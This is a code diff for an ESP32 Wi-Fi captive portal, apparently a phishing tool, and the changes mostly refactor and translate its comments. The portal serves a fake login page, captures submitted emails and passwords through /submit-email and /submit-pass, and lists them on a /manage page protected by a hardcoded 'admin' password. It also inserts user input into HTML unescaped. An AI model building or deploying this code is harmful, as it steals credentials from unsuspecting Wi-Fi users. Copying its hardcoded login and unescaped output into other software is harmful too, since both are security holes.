@@ -32,6 +32,7 @@ String CredentialList;
 String email;
 String pass;
 
+// Credentials for manage.html //////////////////////////////////////////////////////////
 const char* http_username = "admin";
 const char* http_password = "securepassword";
 
@@ -40,31 +41,28 @@ void checkCredentials(AsyncWebServerRequest *request) {
     request->requestAuthentication();
   }
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
-String loadFile(String path, bool asBinary = false) {
-  File file = SPIFFS.open(path, asBinary ? "rb" : "r");
-  if (!file) {
+// Load SPIFFS files ////////////////////////////////////////////////////////////////////
+String loadFile(String path) {
+  if (!SPIFFS.exists(path)) {
+    Serial.println("File not found: " + path);
+    return "";
+  }
+
+  File file = SPIFFS.open(path, "r");
+  if (!file || file.isDirectory()) {
     Serial.println("Failed to open file: " + path);
     return "";
   }
 
-  String content;
-  if (asBinary) {
-    size_t fileSize = file.size();
-    uint8_t *buffer = (uint8_t*)malloc(fileSize);
-    if (buffer) {
-      file.read(buffer, fileSize);
-      content = String((char*)buffer, fileSize);
-      free(buffer);
-    }
-  } else {
-    content = file.readString();
-  }
-
+  String content = file.readString();
   file.close();
   return content;
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
+// Reset Device Handler /////////////////////////////////////////////////////////////////
 void handleResetDevice(AsyncWebServerRequest *request) {
   request->send(200, "text/html", "Resetting EEPROM and SSID...");
 
@@ -81,8 +79,9 @@ void handleResetDevice(AsyncWebServerRequest *request) {
   delay(1000); // Give the response time to be sent
   ESP.restart();
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
-//--------------------ZMIENIANIE SSID-----------------------//
+// Change SSID Handler //////////////////////////////////////////////////////////////////
 int h2int(char c);
 String urldecode(String input);
 
@@ -92,7 +91,7 @@ void handleSsidChange(AsyncWebServerRequest *request) {
     String newSsid = urldecode(newSsidEncoded);
     ssid = newSsid;
 
-    // Zapisz nowe SSID do pamięci EEPROM
+    // Save new SSID to EEPROM memory
     EEPROM.begin(512);
     EEPROM.put(EEPROM_SSID_ADDRESS, ssid);
     EEPROM.commit();
@@ -105,8 +104,9 @@ void handleSsidChange(AsyncWebServerRequest *request) {
     request->send(400, "text/html", "Bad Request");
   }
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
-// DEKODOWANIE SSID
+// DECODING SSID ////////////////////////////////////////////////////////////////////////
 String urldecode(String input) {
   String output = "";
   char c;
@@ -122,7 +122,7 @@ String urldecode(String input) {
   }
   return output;
 }
-// DEKODOWANIE SSID
+
 int h2int(char c) {
   if (c >= '0' && c <='9')
     return (c - '0');
@@ -132,13 +132,15 @@ int h2int(char c) {
     return (c - 'A' + 10);
   return 0;
 }
-//----------------------------------------------------//
+/////////////////////////////////////////////////////////////////////////////////////////
 
+// Restart ESP32 handler ////////////////////////////////////////////////////////////////
 void handleRestartDevice(AsyncWebServerRequest *request) {
   request->send(200, "text/html", "Restarting device...");
   delay(1000); // Give the response time to be sent
   ESP.restart();
 }
+/////////////////////////////////////////////////////////////////////////////////////////
 
 void setUpDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
 #define DNS_INTERVAL 30
@@ -173,8 +175,7 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
 
     server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });
 
-
-	//LOADING HTML PAGES
+	// Loading frontend pages /////////////////////////////////////////////////////////////
   server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
     String content = loadFile("/index.html");
     AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
@@ -183,24 +184,49 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
     Serial.println("Served Basic HTML Page");
   	});
 
-    server.on("/login", HTTP_ANY, [](AsyncWebServerRequest *request) {
+  server.on("/login", HTTP_ANY, [](AsyncWebServerRequest *request) {
     String content = loadFile("/login.html");
     AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
     response->addHeader("Cache-Control", "public,max-age=31536000");
     request->send(response);
     Serial.println("Served login HTML Page");
-    });
+  });
 
-    // LOADING STYLES
-    server.on("/fonts.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
-        String content = loadFile("/fonts.css");
-        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
-        response->addHeader("Cache-Control", "public,max-age=31536000");
+  server.on("/blank", HTTP_ANY, [](AsyncWebServerRequest *request) {
+    String content = loadFile("/blank.html");
+    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
+    response->addHeader("Cache-Control", "public,max-age=31536000");
+    request->send(response);
+    Serial.println("Served login HTML Page");
+  });
+  ///////////////////////////////////////////////////////////////////////////////////////
+
+  // Loading fonts //////////////////////////////////////////////////////////////////////
+  static const char* CONTENT_TYPE_WOFF2 {"application/x-font-woff2"};
+
+  server.on("/roboto-regular.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
+        AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, roboto_regular_woff2, roboto_regular_woff2_len);
         request->send(response);
-        Serial.println("Served CSS Style Sheet");
-    });
+  });
 
-    server.on("/style.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
+  server.on("/roboto-medium.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
+        AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, roboto_medium_woff2, roboto_medium_woff2_len);
+        request->send(response);
+  });
+
+  server.on("/google-regular.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
+        AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, google_regular_woff2, google_regular_woff2_len);
+        request->send(response);
+  });
+
+  server.on("/google-medium.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
+        AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, google_medium_woff2, google_medium_woff2_len);
+        request->send(response);
+  });
+  ///////////////////////////////////////////////////////////////////////////////////////
+
+  // Loading CSS styles /////////////////////////////////////////////////////////////////
+  server.on("/style.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
         String content = loadFile("/style.css");
         AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
         response->addHeader("Cache-Control", "public,max-age=31536000");
@@ -208,35 +234,25 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
         Serial.println("Served CSS Style Sheet");
     });
 
-	  server.on("/style2.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
+	server.on("/style2.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
         String content = loadFile("/style2.css");
         AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
         response->addHeader("Cache-Control", "public,max-age=31536000");
         request->send(response);
         Serial.println("Served CSS Style Sheet");
     });
+  
+  server.on("/fonts.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
+        String content = loadFile("/fonts.css");
+        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
+        response->addHeader("Cache-Control", "public,max-age=31536000");
+        request->send(response);
+        Serial.println("Served CSS Style Sheet");
+    });
 
-    // Loading Fonts
+  ///////////////////////////////////////////////////////////////////////////////////////
 
-    static const char* CONTENT_TYPE_WOFF2 {"application/x-font-woff2"};
-
-    server.on("/roboto-regular.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
-          AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, roboto_regular_woff2, roboto_regular_woff2_len);
-          request->send(response);
-      });
-    server.on("/roboto-medium.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
-          AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, roboto_medium_woff2, roboto_medium_woff2_len);
-          request->send(response);
-      });
-    server.on("/google-regular.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
-          AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, google_regular_woff2, google_regular_woff2_len);
-          request->send(response);
-      });
-    server.on("/google-medium.woff2", HTTP_GET, [](AsyncWebServerRequest * const request) {
-          AsyncWebServerResponse* const response = request->beginResponse_P(200, CONTENT_TYPE_WOFF2, google_medium_woff2, google_medium_woff2_len);
-          request->send(response);
-      });
-
+  // Loading backend page ///////////////////////////////////////////////////////////////
   server.on("/manage", HTTP_ANY, [](AsyncWebServerRequest *request) {
     checkCredentials(request);
     String dynamicManageHTML = loadFile("/manage.html");
@@ -247,52 +263,45 @@ void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
     Serial.println("Served Manage HTML Page");
   });
 
-  server.on("/blank", HTTP_ANY, [](AsyncWebServerRequest *request) {
-    String content = loadFile("/blank.html");
-    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
-    response->addHeader("Cache-Control", "public,max-age=31536000");
-    request->send(response);
-    Serial.println("Served login HTML Page");
-  });
-
+  // Loading backend actions ////////////////////////////////////////////////////////////
 	server.on("/change-ssid", HTTP_POST, handleSsidChange);
 
 	server.on("/restart-device", HTTP_POST, handleRestartDevice);
 
 	server.on("/reset-device", HTTP_POST, handleResetDevice);
+  ///////////////////////////////////////////////////////////////////////////////////////
 
-    // New handler for submitting email
-    server.on("/submit-email", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("email", true)) {
-        email = request->getParam("email", true)->value();
+  // Handler for submitting email ///////////////////////////////////////////////////////
+  server.on("/submit-email", HTTP_POST, [](AsyncWebServerRequest *request) {
+  if (request->hasParam("email", true)) {
+      email = request->getParam("email", true)->value();
 
-        // You can store, display, or process email and pass as needed
-        CredentialList += "Email: <div style='background-color:" + email + "; padding: 10px; margin: 5px;'>" + email + "</div>";
+      // You can store, display, or process email and pass as needed
+      CredentialList += "Email: <div style='background-color:" + email + "; padding: 10px; margin: 5px;'>" + email + "</div>";
 
-        request->redirect("/login"); // Redirect back to the pass page after submitting email
+      request->redirect("/login"); // Redirect to the pass page after submitting email
+  }
+  });
+  // Handler for submitting password ////////////////////////////////////////////////////
+  server.on("/submit-pass", HTTP_POST, [](AsyncWebServerRequest *request) {
+  if (request->hasParam("pass", true)) {
+      pass = request->getParam("pass", true)->value();
+
+		  // You can store, display, or process email and pass as needed
+		  CredentialList += "Password: <div style='background-color:" + pass + "; padding: 10px; margin: 5px;'>" + pass + "<hr></div>";
+
+      request->redirect("/blank"); // Redirect to the blank page after submitting pass
     }
-
-});
-    // New handler for submitting pass
-    server.on("/submit-pass", HTTP_POST, [](AsyncWebServerRequest *request) {
-    if (request->hasParam("pass", true)) {
-        pass = request->getParam("pass", true)->value();
-
-		// You can store, display, or process email and pass as needed
-		CredentialList += "Password: <div style='background-color:" + pass + "; padding: 10px; margin: 5px;'>" + pass + "<hr></div>";
-
-        request->redirect("/blank"); // Redirect back to the blank page after submitting pass
-    }
-});
-
-    server.onNotFound([](AsyncWebServerRequest *request) {
-        request->redirect(localIPURL);
-        Serial.print("onnotfound ");
-        Serial.print(request->host());
-        Serial.print(" ");
-        Serial.print(request->url());
-        Serial.print(" sent redirect to " + localIPURL + "\n");
-    });
+  });
+  ///////////////////////////////////////////////////////////////////////////////////////
+  server.onNotFound([](AsyncWebServerRequest *request) {
+      request->redirect(localIPURL);
+      Serial.print("onnotfound ");
+      Serial.print(request->host());
+      Serial.print(" ");
+      Serial.print(request->url());
+      Serial.print(" sent redirect to " + localIPURL + "\n");
+  });
 }
 
 void setup() {
@@ -302,14 +311,18 @@ void setup() {
     while (!Serial)
         ;
 
-	if (!SPIFFS.begin()) {
-    Serial.println("Failed to mount file system");
-    return;
-  }
+    // CHECK SPIFFS mount files /////////////////////////////////////////////////////////
+    if (!SPIFFS.begin()) {
+      Serial.println("Failed to mount file system");
+      return;
+    }
+    /////////////////////////////////////////////////////////////////////////////////////
 
-	EEPROM.begin(512);
-	EEPROM.get(EEPROM_SSID_ADDRESS, ssid);
-	EEPROM.end();
+    // WRITE SSID TO EEPROM memory //////////////////////////////////////////////////////
+    EEPROM.begin(512);
+    EEPROM.get(EEPROM_SSID_ADDRESS, ssid);
+    EEPROM.end();
+    /////////////////////////////////////////////////////////////////////////////////////
 
     Serial.println("\n\nCaptive Test, V0.5.0 compiled " __DATE__ " " __TIME__ " by CD_FER");
     Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());
